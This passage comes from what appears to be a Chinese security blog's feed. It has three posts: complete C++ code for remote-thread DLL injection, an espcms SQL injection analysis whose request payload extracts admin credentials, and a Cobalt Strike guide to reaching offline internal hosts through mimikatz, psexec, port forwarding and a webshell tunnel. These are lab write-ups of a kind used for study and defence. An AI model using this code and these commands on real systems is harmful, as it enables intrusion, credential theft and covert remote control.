class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Dll Injected&quot;</span>), _T(<span class="string">&quot;tips&quot;</span>), MB_OK);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Tlhelp32.h.&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">//提升权限代码</span></span><br><span class="line"><span class="function">BOOL <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span>* szDllPathName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// #0.提升进程为DEBUG权限</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustProcessTokenPrivilege())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;提权失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OPENPROCESS Error ! \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//在目标进程分配内存并写入dll路径名</span></span><br><span class="line">    LPVOID lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VIRTUALALLOCEX Error !  \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error ! \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取LoadLibraryA 函数地址</span></span><br><span class="line">    FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dwLoadAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建远程线程,加载dll</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreatRemoteTread Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LoadDll(<span class="number">25028</span>, (<span class="keyword">char</span>*)<span class="string">&quot;C:\\Users\\Administrator\\source\\repos\\Project8\\Project8\\DllTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择PID为25028的进程进行注入</p><p><a href="https://imgbed.cn/preview?id=6018fc43f194b200017364cc"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/3aab9a86-5a38-46cd-8dff-81bf3eb4b27f.png" alt="imgbed.cn图床"></a></p><p>注入成功，弹出MessageBox</p><p><a href="https://imgbed.cn/preview?id=6018fc39bd63390001d215f7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fcf08c29-2e1c-4d1f-982d-4fbf3c7e8d27.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="espcms前台注入分析"><a href="#espcms前台注入分析" class="headerlink" title="espcms前台注入分析"></a>espcms前台注入分析</h1><p>《代码审计 企业级Web代码安全架构》一书中出现的cms，14年的老版本出现的Insert型注入。漏洞位于前台提交订单处</p><p>/interface/order.php</p><p>$ptitle和$tsn为可控变量，通过accept方法获取参数</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/237c2f01-4c8d-4c6b-874a-5944d082746b.png" alt="imgbed.cn图床"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ptitle</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;ptitle&#x27;</span>, <span class="string">&#x27;P&#x27;</span>);</span><br><span class="line"><span class="variable">$tsn</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;tsn&#x27;</span>, <span class="string">&#x27;P&#x27;</span>);</span><br></pre></td></tr></table></figure><p>/public/class_function.php处找到accept函数的定义，从$_GET和$_POST数组中获取内容，并使用daddslashes函数过滤。</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/6fc076c5-a329-4950-8ccd-7c96f566fc5e.png" alt="imgbed.cn图床"></a></p><p>查看daddslashes函数声明，首先判断gpc是否开启，未开启则开启gpc，当$string为数组或为字符串时，调用addslashes对函数进行过滤并返回过滤后的$string</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1fb0abb5-0da8-4d05-921c-99aca0eb0f9f.png" alt="imgbed.cn图床"></a></p><p>第373行拼接并执行了sql语句，可控变量$tsn和$ptitle未经过任何过滤就拼接到了sql语句中,这个 $tsn 和 $did $ptitle 都是可控的变量,相当于 $_POST[XXX] ，$tsn 不为数组时取值就会变成 $tsn{x}的方式 ，$temp =  “abc”$temp[0]的值为a。$tsn参数提交一个’，经过daddslashes转义后自动添加\变成\‘，取$tsn[0]为,可以利用这个来达到绕过转义的限制，来达到注入的目的。</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/910c1ace-b39b-4993-b983-d076984e6b45.png" alt="imgbed.cn图床"></a></p><p>正常请求的数据包，可以看到默认传递$ptitle[]和$tsn[]，%5B%5D为url编码后的[]</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/espcms/index.php?ac=order&amp;at=ordersave</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 541</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost/espcms/index.php?ac=order&amp;at=orderpay</span><br><span class="line"><span class="attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95</span><br></pre></td></tr></table></figure><p>正常提交执行的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> espcms_order_info (<span class="keyword">oid</span>,did,tsn,title,oprice,bprice,countprice,amount,inventory) <span class="keyword">VALUES</span> (<span class="number">12</span>,<span class="number">26</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;HTC S510e&#x27;</span>,<span class="number">3200</span>,<span class="number">3100</span>,<span class="number">3100</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>$tsn去掉[]后提交 \</p><p>$ptitle[]提交   ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#</p><p>​    $tsn与$ptitle均有单引号包裹，拼接到sql语句中$tsn与$ptitle默认被当作数组处理，当$tsn为字符串时,尝试提交$tsn内容为‘，经过accept函数处理，daddslashes函数转义后$tsn为\‘并拼接到sql语句中，原本包裹$tsn的后一个引号被转义，$tsn的前一个引号与$ptitle的前一个引号闭合，相当于$tsn实际内容为’\‘,’</p><p>​    </p><p>注入执行的sql语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> espcms_order_info (<span class="keyword">oid</span>,did,tsn,title,oprice,bprice,countprice,amount,inventory) <span class="keyword">VALUES</span> (<span class="number">12</span>,<span class="number">36</span>,<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#&#x27;</span>,<span class="number">3200</span>,<span class="number">3100</span>,<span class="number">3100</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>在提交订单时候用burpsuite抓包并修改</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/279c51e5-cce6-43af-8bf6-7bdbd3654518.png" alt="imgbed.cn图床"></a></p><p>利用成功</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/b58a6081-ec88-46de-a77d-ae0e72568c2a.png" alt="imgbed.cn图床"></a></p><p>参考：</p><p><a href="https://www.uedbox.com/post/25828/">https://www.uedbox.com/post/25828/</a></p><p><a href="https://www.seebug.org/vuldb/ssvid-94423">https://www.seebug.org/vuldb/ssvid-94423</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>不出网主机上线方法</title>
    <link href="/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"/>
    <url>/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段</p><h3 id="web服务器-Windows-2008-r2"><a href="#web服务器-Windows-2008-r2" class="headerlink" title="web服务器 Windows 2008 r2"></a>web服务器 Windows 2008 r2</h3><p>DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 </p><p>公网ip:192.168.111.132</p><p>内网ip:192.168.204.188</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d5ebe3b7-283f-40c7-9681-573846cfeb2b.png"></p><h3 id="内网主机-Windows-2012"><a href="#内网主机-Windows-2012" class="headerlink" title="内网主机 Windows 2012"></a>内网主机 Windows 2012</h3><p>虚拟机网卡设置HOSTONLY模式，不通外网</p><p>内网ip:192.168.204.141</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/59f84afe-29df-4463-ba3c-77a61d7c924e.png"></p><h3 id="C2：-Kali-Linux"><a href="#C2：-Kali-Linux" class="headerlink" title="C2： Kali Linux"></a>C2： Kali Linux</h3><p>公网ip：192.168.111.129</p><h2 id="1-SMB-beacon"><a href="#1-SMB-beacon" class="headerlink" title="1.SMB beacon"></a>1.SMB beacon</h2><p>​    SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p><p>​    首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/19eb81a2-f005-4078-a051-448004d9796b.png"></p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p> 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。<br> 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br> 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>web服务器上线cs，run mimikatz抓取密码</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/cfc1a2fb-2f6c-4213-801c-2560692d1918.png"></p><p>建立listener，选择SMB beacon</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f690ca9d-1589-4adc-9a13-67a0f79896a0.png"></p><p>在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a1bb87d1-7d21-42c2-89c7-45e7c1dc52a5.png"></p><p>连接成功，可以看到smb beacon上线的主机右侧有∞∞标识</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/70176bc3-c391-4a74-99a0-e46e61488cac.png"></p><h2 id="2-配置listener通过HTTP代理上线"><a href="#2-配置listener通过HTTP代理上线" class="headerlink" title="2.配置listener通过HTTP代理上线"></a>2.配置listener通过HTTP代理上线</h2><h3 id="使用goproxy搭建代理"><a href="#使用goproxy搭建代理" class="headerlink" title="使用goproxy搭建代理"></a>使用goproxy搭建代理</h3><p><a href="https://github.com/snail007/goproxy/releases">goproxy</a></p><p>上传proxy.exe到web服务器，在8080端口开启http代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon</span><br></pre></td></tr></table></figure><p>用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.204.188 listenport&#x3D;822 connectaddress&#x3D;192.168.111.132 connectport&#x3D;8080</span><br></pre></td></tr></table></figure><p>检测端口是否启用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr :822</span><br></pre></td></tr></table></figure><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c3fae3ca-b808-4541-89f6-086887028ae4.png"></p><h3 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h3><p>设置如下</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/362076f2-3cf5-469c-96ef-7b5c2b759f30.png"></p><h3 id="生成stageless-payload"><a href="#生成stageless-payload" class="headerlink" title="生成stageless payload"></a>生成stageless payload</h3><p>关于stage 和 stageless的区别：</p><p><a href="https://www.freebuf.com/articles/system/187312.html">探寻Metasploit Payload模式背后的秘密</a></p><p>stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行</p><p>stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2d77176-06a3-438e-9cd0-2a926b8239c2.png"></a></p><p>成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/43ac908f-2d4f-40db-b2d5-8f3307a1a167.png"></a></p><p>连接过程</p><p><code>192.168.204.141</code>  → <code>192.168.204.188:822</code>→ <code>192.168.111.132:8080</code>→ <code>C2</code></p><h2 id="3-使用pystinger搭建socks4代理"><a href="#3-使用pystinger搭建socks4代理" class="headerlink" title="3.使用pystinger搭建socks4代理"></a>3.使用pystinger搭建socks4代理</h2><p><a href="https://github.com/FunnyWolf/pystinger">pystinger</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>来源:<a href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p><p>服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/53d52a9c-c154-4f08-b84d-f87e8f129ea0.png"></a></p><h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><p>上传proxy.php到网站目录，正常访问返回<code>UTF-8</code></p><p>上传stinger_server.exe，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start stinger_server.exe 0.0.0.0</span><br></pre></td></tr></table></figure><p>Kali上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stinger_client -w http:&#x2F;&#x2F;192.168.111.132:81&#x2F;proxy.php -l 127.0.0.1 -p 60000</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/97c6949c-ef85-4518-a49f-78afbb0a1783.png"></a></p><p>cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/80fc1a27-bcad-4ce4-964b-b826df97b771.png"></a></p><p>使用psexec横向移动，选择listener为stinger，成功上线</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d324ea94-6ba5-404e-9659-a4dd33c33d5d.png"></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://blog.leanote.com/post/snowming/2ec80f7823e0">Cobalt Strike Listener with Proxy          </a></p><p><a href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p><p><a 